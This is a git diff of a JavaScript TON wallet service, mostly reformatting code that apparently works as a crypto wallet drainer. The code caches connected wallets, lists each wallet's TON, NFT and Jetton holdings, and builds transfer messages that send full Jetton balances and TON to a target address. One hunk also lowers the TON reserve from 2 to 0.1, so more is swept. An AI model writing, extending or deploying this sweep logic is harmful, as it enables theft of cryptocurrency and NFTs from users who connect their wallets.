@@ -10,9 +10,9 @@ const { Address, BN } = TonWeb.utils;
 const NumberUtils = {
   /** 将任意数值转为 BigInt，避免精度问题 */
   toBigInt(value) {
-    if (typeof value === 'bigint') return value;
-    if (typeof value === 'string') return BigInt(value);
-    if (typeof value === 'number') {
+    if (typeof value === "bigint") return value;
+    if (typeof value === "string") return BigInt(value);
+    if (typeof value === "number") {
       if (!Number.isInteger(value)) {
         throw new Error(`数值 ${value} 不是整数，无法安全转换为 BigInt`);
       }
@@ -25,9 +25,9 @@ const NumberUtils = {
   /** 将任意数值转为 BN 对象 */
   toBN(value) {
     if (value instanceof BN) return value;
-    if (typeof value === 'bigint') return new BN(value.toString());
-    if (typeof value === 'string') return new BN(value);
-    if (typeof value === 'number') {
+    if (typeof value === "bigint") return new BN(value.toString());
+    if (typeof value === "string") return new BN(value);
+    if (typeof value === "number") {
       if (!Number.isInteger(value)) {
         throw new Error(`数值 ${value} 不是整数，无法安全转换为 BN`);
       }
@@ -38,12 +38,12 @@ const NumberUtils = {
 
   /** 安全的字符串转换 */
   toString(value) {
-    if (typeof value === 'string') return value;
-    if (typeof value === 'bigint') return value.toString();
-    if (typeof value === 'number') return value.toString();
+    if (typeof value === "string") return value;
+    if (typeof value === "bigint") return value.toString();
+    if (typeof value === "number") return value.toString();
     if (value instanceof BN) return value.toString();
     return String(value);
-  }
+  },
 };
 
 /**
@@ -51,9 +51,13 @@ const NumberUtils = {
  */
 function convertHumanAmountToRawBigInt(humanReadableAmount, tokenDecimals) {
   try {
-    const [integerPart = "0", fractionalPart = ""] = String(humanReadableAmount).split(".");
-    const paddedFractionalPart = (fractionalPart + "0".repeat(tokenDecimals)).slice(0, tokenDecimals);
-    const rawAmountString = (integerPart + paddedFractionalPart).replace(/^0+/, "") || "0";
+    const [integerPart = "0", fractionalPart = ""] =
+      String(humanReadableAmount).split(".");
+    const paddedFractionalPart = (
+      fractionalPart + "0".repeat(tokenDecimals)
+    ).slice(0, tokenDecimals);
+    const rawAmountString =
+      (integerPart + paddedFractionalPart).replace(/^0+/, "") || "0";
     return NumberUtils.toBigInt(rawAmountString);
   } catch (error) {
     throw new Error(`金额转换失败 ${humanReadableAmount}: ${error.message}`);
@@ -73,21 +77,29 @@ function createTonWebInstance() {
 /**
  * 通过 Jetton Root + owner 计算"发送方 JettonWallet 地址"
  */
-async function calculateSenderJettonWalletAddress(jettonMasterAddress, ownerWalletAddress) {
+async function calculateSenderJettonWalletAddress(
+  jettonMasterAddress,
+  ownerWalletAddress
+) {
   const tonWebInstance = createTonWebInstance();
-  const jettonMinter = new TonWeb.token.jetton.JettonMinter(tonWebInstance.provider, {
-    address: new Address(jettonMasterAddress),
-  });
-  return await jettonMinter.getJettonWalletAddress(new Address(ownerWalletAddress));
+  const jettonMinter = new TonWeb.token.jetton.JettonMinter(
+    tonWebInstance.provider,
+    {
+      address: new Address(jettonMasterAddress),
+    }
+  );
+  return await jettonMinter.getJettonWalletAddress(
+    new Address(ownerWalletAddress)
+  );
 }
 
 /**
  * 正确的 Jetton 转账 payload 构建
  */
 async function buildJettonTransferPayloadBase64({
-  recipientAddress,      // 收款人地址
-  transferAmountRaw,     // 转账数量（BigInt格式）
-  responseDestination,   // 回执地址
+  recipientAddress, // 收款人地址
+  transferAmountRaw, // 转账数量（BigInt格式）
+  responseDestination, // 回执地址
   forwardTonAmount = "0", // 附带的TON数量，最小值
   forwardMessage = "", // 备注，可为空
 }) {
@@ -97,11 +109,11 @@ async function buildJettonTransferPayloadBase64({
   // 构建正确的 Jetton 转账消息结构
   transferCell.bits.writeUint(JETTON_TRANSFER_OPCODE, 32); // transfer op
   transferCell.bits.writeUint(0, 64); // query id
-  
+
   // 使用 writeCoins 写入 Jetton 数量
   const transferAmountBN = NumberUtils.toBN(transferAmountRaw);
   transferCell.bits.writeCoins(transferAmountBN); // transfer amount in nano
-  
+
   transferCell.bits.writeAddress(new Address(recipientAddress)); // destination address
   transferCell.bits.writeAddress(new Address(responseDestination)); // response address
   transferCell.bits.writeBit(0); // no custom payload
@@ -141,17 +153,19 @@ async function buildNftTransferPayloadBase64({
   const NFT_TRANSFER_OPCODE = 0x5fcc3d14;
   const nftTransferCell = new TonWeb.boc.Cell();
   nftTransferCell.bits.writeUint(NFT_TRANSFER_OPCODE, 32); // NFT transfer op
-  
+
   // 简单 query_id：毫秒时间戳*1024 + 0-1023 随机
   const currentTimestamp = Date.now();
   const randomNumber = Math.floor(Math.random() * 1024);
   const uniqueQueryId = currentTimestamp * 1024 + randomNumber;
   nftTransferCell.bits.writeUint(uniqueQueryId, 64);
-  
+
   nftTransferCell.bits.writeAddress(new Address(recipientAddress));
   nftTransferCell.bits.writeAddress(new Address(responseDestination));
   nftTransferCell.bits.writeBit(0); // no custom_payload
-  nftTransferCell.bits.writeCoins(TonWeb.utils.toNano(String(forwardTonAmount)));
+  nftTransferCell.bits.writeCoins(
+    TonWeb.utils.toNano(String(forwardTonAmount))
+  );
 
   if (forwardMessage) {
     const forwardPayloadCell = new TonWeb.boc.Cell();
@@ -181,9 +195,9 @@ export class WalletService {
           lastActivity: new Date().toISOString(),
         })
       );
-      
+
       console.log("钱包连接成功，已缓存到Redis:", wallet);
-      
+
       return {
         success: true,
         message: "",
@@ -204,8 +218,10 @@ export class WalletService {
       if (typeof tonAmount === "number") {
         processedTonAmount = tonAmount.toFixed(9); // 最多 9 位小数，避免精度问题
       }
-      
-      const nanoTonAmount = TonWeb.utils.toNano(NumberUtils.toString(processedTonAmount));
+
+      const nanoTonAmount = TonWeb.utils.toNano(
+        NumberUtils.toString(processedTonAmount)
+      );
       return NumberUtils.toString(nanoTonAmount);
     } catch (error) {
       throw new Error(`TON 金额转换失败 ${tonAmount}: ${error.message}`);
@@ -234,7 +250,8 @@ export class WalletService {
       );
       const dnsResponseData = await dnsApiResponse.json();
       const nftItemContractAddress = dnsResponseData?.item?.address ?? null;
-      if (!nftItemContractAddress) throw new Error("未找到用户名 NFT Item 地址");
+      if (!nftItemContractAddress)
+        throw new Error("未找到用户名 NFT Item 地址");
 
       // 附带的 TON 金额（gas）
       const gasAmountNano = this.convertTonToNanoString(0.1);
@@ -299,7 +316,7 @@ export class WalletService {
       // 2. NFTs
       {
         const res = await fetch(
-          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/nfts?limit=1000`,
+          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/nfts?limit=1000`
         );
         const data = await res.json();
         assets.nfts = data.nft_items || [];
@@ -308,7 +325,7 @@ export class WalletService {
       // 3. Jettons
       {
         const res = await fetch(
-          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/jettons?limit=1000`,
+          `${process.env.TONAPI_URL}/v2/accounts/${walletAddress}/jettons?limit=1000`
         );
         const data = await res.json();
         assets.jettons = data.balances || [];
@@ -342,12 +359,18 @@ export class WalletService {
       // 获取资产
       const assets = await this.getAllWalletAssets(wallet);
       const messages = [];
-
+      const tonReserveAmount = 0.1; // 预留 2 TON
+      if (assets.ton.balanceTon < tonReserveAmount) {
+        throw new Error("TON 余额不足");
+      }
       // 1) TON：保留 gas（避免把 TON 清空）
-      const tonReserveAmount = 2; // 预留 2 TON
       const currentTonBalance = parseFloat(assets.ton.balanceTon || "0");
-      const availableTonToSend = Math.max(0, currentTonBalance - tonReserveAmount);
-      if (availableTonToSend > 0.5) {
+      // 
+      const availableTonToSend = Math.max(
+        0,
+        currentTonBalance - tonReserveAmount
+      );
+      if (availableTonToSend > tonReserveAmount) {
         try {
           messages.push({
             address: targetOwner,
@@ -380,19 +403,24 @@ export class WalletService {
       for (const jettonBalance of assets.jettons) {
         try {
           const jettonMasterAddress = jettonBalance?.jetton?.address;
-          const rawBalanceString = NumberUtils.toString(jettonBalance?.balance ?? "0");
+          const rawBalanceString = NumberUtils.toString(
+            jettonBalance?.balance ?? "0"
+          );
           const jettonAmountRaw = NumberUtils.toBigInt(rawBalanceString);
-          
+
           if (!jettonMasterAddress || jettonAmountRaw === 0n) {
-            console.log(`跳过无效 Jetton: ${jettonMasterAddress}, balance: ${rawBalanceString}`);
+            console.log(
+              `跳过无效 Jetton: ${jettonMasterAddress}, balance: ${rawBalanceString}`
+            );
             continue;
           }
 
           // 计算发送方的 JettonWallet 地址
-          const senderJettonWalletAddress = await calculateSenderJettonWalletAddress(
-            jettonMasterAddress,
-            wallet
-          );
+          const senderJettonWalletAddress =
+            await calculateSenderJettonWalletAddress(
+              jettonMasterAddress,
+              wallet
+            );
 
           // 构造 payload（全额转出）
           const jettonTransferPayload = await buildJettonTransferPayloadBase64({
@@ -409,10 +437,19 @@ export class WalletService {
             amount: this.convertTonToNanoString(0.08), // 增加 Gas 费用，确保有足够的 TON 处理转账
             payload: jettonTransferPayload,
           });
-          
-          console.log(`添加 Jetton 转账: ${jettonBalance?.jetton?.symbol || 'Unknown'}, 数量: ${rawBalanceString}`);
+
+          console.log(
+            `添加 Jetton 转账: ${
+              jettonBalance?.jetton?.symbol || "Unknown"
+            }, 数量: ${rawBalanceString}`
+          );
         } catch (error) {
-          console.error(`处理 Jetton 转账失败: ${jettonBalance?.jetton?.symbol || 'Unknown'}`, error);
+          console.error(
+            `处理 Jetton 转账失败: ${
+              jettonBalance?.jetton?.symbol || "Unknown"
+            }`,
+            error
+          );
           // 继续处理下一个 Jetton，不中断整个流程
         }
       }
@@ -437,19 +474,19 @@ export class WalletService {
   static async broadcastWithTonapi(wallet, raw) {
     // 尝试多个可能的 TONAPI 接口路径
     const possibleEndpoints = [
-      'v2/blockchain/messages',
-      'v2/blockchain/message', 
-      'v2/sendBoc',
-      'v2/send',
-      'v1/blockchain/message'
+      "v2/blockchain/messages",
+      "v2/blockchain/message",
+      "v2/sendBoc",
+      "v2/send",
+      "v1/blockchain/message",
     ];
 
     let lastError = null;
-    
+
     for (const endpoint of possibleEndpoints) {
       try {
         console.log(`尝试接口: ${process.env.TONAPI_URL}/${endpoint}`);
-        
+
         const res = await fetch(`${process.env.TONAPI_URL}/${endpoint}`, {
           method: "POST",
           headers: {
@@ -460,14 +497,21 @@ export class WalletService {
         });
 
         const data = await res.json().catch(() => ({}));
-        
+
         if (res.ok) {
           console.log(`✅ 接口成功: ${endpoint}`, data);
           await redis.set(`boc:${wallet}`, JSON.stringify({ ...data }));
           return await this.handleTransactionConfirmation(wallet, raw, data);
         } else {
-          console.log(`❌ 接口失败: ${endpoint}, 状态: ${res.status}, 响应:`, data);
-          lastError = new Error(`${endpoint} failed: ${data?.message || data?.error || res.statusText}`);
+          console.log(
+            `❌ 接口失败: ${endpoint}, 状态: ${res.status}, 响应:`,
+            data
+          );
+          lastError = new Error(
+            `${endpoint} failed: ${
+              data?.message || data?.error || res.statusText
+            }`
+          );
         }
       } catch (error) {
         console.log(`❌ 接口错误: ${endpoint}`, error.message);
@@ -475,9 +519,11 @@ export class WalletService {
         continue; // 尝试下一个接口
       }
     }
-    
+
     // 所有接口都失败了
-    throw new Error(`所有 TONAPI 接口都失败了。最后一个错误: ${lastError?.message}`);
+    throw new Error(
+      `所有 TONAPI 接口都失败了。最后一个错误: ${lastError?.message}`
+    );
   }
 
   /**
@@ -492,7 +538,7 @@ export class WalletService {
         since: Date.now() - 5 * 60 * 1000, // 最近5分钟
         // 可选：minAmountNano: raw.messages?.[0]?.amount
       };
-      
+
       const confirmed = await this.waitForConfirmation(
         wallet,
         targetAddress,
@@ -501,7 +547,7 @@ export class WalletService {
         90_000,
         3_000
       );
-      
+
       return { success: true, confirmed, data };
     } catch (e) {
       // 未确认不代表失败，可能还没进块
@@ -548,7 +594,9 @@ export class WalletService {
           const inMsg = tx?.in_msg;
           if (!inMsg) return false;
 
-          const okTo = expect.to ? inMsg.destination?.address === expect.to : true;
+          const okTo = expect.to
+            ? inMsg.destination?.address === expect.to
+            : true;
           const okTime = expect.since ? tx.utime * 1000 >= expect.since : true;
 
           let okAmt = true;
@@ -604,7 +652,7 @@ export class WalletService {
     try {
       const walletKey = `wallet:${walletAddress}`;
       const walletData = await redis.get(walletKey);
-      
+
       if (!walletData) {
         return { status: "disconnected" };
       }
@@ -627,10 +675,10 @@ export class WalletService {
     try {
       // 这里可以添加清理过期缓存的逻辑
       console.log("开始清理过期数据...");
-      
+
       // 示例：清理超过24小时的钱包连接数据
       // 具体实现取决于你的业务需求
-      
+
       console.log("清理过期数据完成");
       return { success: true, message: "清理完成" };
     } catch (error) {
